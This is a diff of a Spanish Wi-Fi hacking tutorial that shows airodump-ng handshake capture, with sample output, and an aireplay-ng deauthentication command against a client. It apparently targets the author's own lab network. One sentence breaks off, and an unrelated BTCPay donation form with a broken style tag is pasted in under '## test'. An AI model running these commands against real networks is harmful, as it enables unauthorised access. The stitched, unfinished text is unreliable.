@@ -199,9 +199,78 @@ Ahora sí, vemos que hay un cliente `28:16:7F:6D:4C:2C` conectado al punto de ac
 Con esto ya tendríamos todos los datos que necesitamos para la captura del handshake
 
 ## A la espera de un handshake
-Para la captura nos vamos a poner en escucha a la espera de capturar un handshake.
-Abrimos una nueva ventana y ejecutamos este comando `sudo airodump-ng -w test1 -c 1 --bssid 1C:B0:44:4C:CD:2F wlx00c0caab5835`
+A continuacion nos vamos a poner en escucha, a la espera de capturar un handshake.
+Abrimos una nueva ventana y ejecutamos este comando ```sudo airodump-ng -w test1 -c 1 --bssid 1C:B0:44:4C:CD:2F wlx00c0caab5835```:
+
+```
+ CH  1 ][ Elapsed: 2 mins ][ 2022-03-19 20:32 ][ fixed channel wlx00c0caab5835: 2 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 1C:B0:44:4C:CD:2F  -27  14      305       16    0  11  130   WPA2 CCMP   PSK  Try_to_hack_this                       
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 1C:B0:44:4C:CD:2F  28:16:7F:6D:4C:2C  -30    1e- 1e   125      137 
+```
+En `-w test` asignamos el nombre del archivo con el que queremos que se guarde nuestro handshake una vez capturado
+Con `-c 1` 
 
 
 ## Ataque de desautenticación
 En otra ventana ejecutamos el comando `sudo aireplay-ng -0 1 -a 1C:B0:44:4C:CD:2F -c 28:16:7F:6D:4C:2C wlx00c0caab5835`
+
+
+
+
+## test 
+
+style> input[type=range].btcpay-input-range { -webkit-appearance:none; width:100%; background: transparent; } input[type=range].btcpay-input-range:focus { outline:0; } input[type=range].btcpay-input-range::-webkit-slider-runnable-track { width:100%; height:3.1px; cursor:pointer; box-shadow:0 0 1.7px #020,0 0 0 #003c00; background:#f3f3f3; border-radius:1px; border:0; } input[type=range].btcpay-input-range::-webkit-slider-thumb { box-shadow:none; border:2.5px solid #cedc21; height:22px; width:22px; border-radius:50%; background:#0f3723; cursor:pointer; -webkit-appearance:none; margin-top:-9.45px } input[type=range].btcpay-input-range:focus::-webkit-slider-runnable-track { background:#fff; } input[type=range].btcpay-input-range::-moz-range-track { width:100%; height:3.1px; cursor:pointer; box-shadow:0 0 1.7px #020,0 0 0 #003c00; background:#f3f3f3; border-radius:1px; border:0; } input[type=range].btcpay-input-range::-moz-range-thumb { box-shadow:none; border:2.5px solid #cedc21; height:22px; width:22px; border-radius:50%; background:#0f3723; cursor:pointer; } input[type=range].btcpay-input-range::-ms-track { width:100%; height:3.1px; cursor:pointer; background:0 0; border-color:transparent; color:transparent; } input[type=range].btcpay-input-range::-ms-fill-lower { background:#e6e6e6; border:0; border-radius:2px; box-shadow:0 0 1.7px #020,0 0 0 #003c00; } input[type=range].btcpay-input-range::-ms-fill-upper { background:#f3f3f3; border:0; border-radius:2px; box-shadow:0 0 1.7px #020,0 0 0 #003c00; } input[type=range].btcpay-input-range::-ms-thumb { box-shadow:none; border:2.5px solid #cedc21; height:22px; width:22px; border-radius:50%; background:#0f3723; cursor:pointer; height:3.1px; } input[type=range].btcpay-input-range:focus::-ms-fill-lower { background:#f3f3f3; } input[type=range].btcpay-input-range:focus::-ms-fill-upper { background:#fff; } </style>
+<form method="POST" action="https://mainnet.demo.btcpayserver.org/api/v1/invoices" class="btcpay-form btcpay-form--block">
+  <input type="hidden" name="storeId" value="HSCNd3KcSaCLuYgHhCoa1NdSppV7GiH4QbZcVYvBTvCk" />
+  <div class="btcpay-custom-container">
+      <input class="btcpay-input-price" type="number" name="price" min="1" max="20" step="1" value="1" data-price="1" style="width:168px;" oninput="handlePriceInput(event);return false" onchange="handleSliderChange(event);return false" />
+    <select name="currency">
+      <option value="USD" selected>USD</option>
+      <option value="GBP">GBP</option>
+      <option value="EUR">EUR</option>
+      <option value="BTC">BTC</option>
+    </select>
+    <input type="range" class="btcpay-input-range" min="1" max="20" step="1" value="1" style="width:168px;margin-bottom:15px;" oninput="handleSliderInput(event);return false" />
+  </div>
+  <input type="image" class="submit" name="submit" src="https://mainnet.demo.btcpayserver.org/img/paybutton/pay.svg" style="width:168px" alt="Pay with BTCPay Server, a Self-Hosted Bitcoin Payment Processor">
+</form>
+<script>
+    function handleSliderChange(event) {
+        event.preventDefault();
+        const root = event.target.closest('.btcpay-form');
+        const el = root.querySelector('.btcpay-input-price');
+        const price = parseInt(el.value);
+        const min = parseInt(event.target.getAttribute('min')) || 1;
+        const max = parseInt(event.target.getAttribute('max'));
+        if (price < min) { 
+            el.value = min;
+        } else if (price > max) {
+            el.value = max;
+        } 
+        root.querySelector('.btcpay-input-range').value = el.value;
+    }
+    
+    function handleSliderInput(event) {
+        event.target.closest('.btcpay-form').querySelector('.btcpay-input-price').value = event.target.value;
+    }
+    
+    function handlePriceInput(event) {
+        event.preventDefault();
+        const root = event.target.closest('.btcpay-form');
+        const price = parseInt(event.target.dataset.price);
+        if (isNaN(event.target.value)) root.querySelector('.btcpay-input-price').value = price;
+        const min = parseInt(event.target.getAttribute('min')) || 1;
+        const max = parseInt(event.target.getAttribute('max'));
+        if (event.target.value < min) {
+            event.target.value = min;
+        } else if (event.target.value > max) { 
+            event.target.value = max;
+        }
+    }
+</script>
